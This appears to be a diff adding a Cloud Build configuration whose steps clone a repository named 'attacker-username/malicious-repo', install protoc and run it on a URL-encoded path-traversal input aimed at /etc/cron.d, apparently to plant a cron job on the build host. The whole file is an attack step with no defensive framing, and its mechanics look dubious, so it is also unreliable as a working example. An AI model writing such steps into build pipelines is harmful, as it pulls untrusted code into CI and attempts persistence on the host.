@@ -1,0 +1,15 @@
+steps:
+  - name: 'gcr.io/cloud-builders/git'
+    args: ['clone', 'https://github.com/attacker-username/malicious-repo.git']
+  - name: 'gcr.io/cloud-builders/apt'
+    args: ['update']
+  - name: 'gcr.io/cloud-builders/apt'
+    args: ['install', '-y', 'protobuf-compiler']
+  - name: 'gcr.io/cloud-builders/gcloud'
+    entrypoint: 'bash'
+    args:
+      - '-c'
+      - |
+        protoc --proto_path=malicious-repo/protos \
+               --js_out=import_style=commonjs,binary:. \
+               malicious-repo/protos/..%2F..%2F..%2Fetc%2Fcron.d%2Fexploit.proto
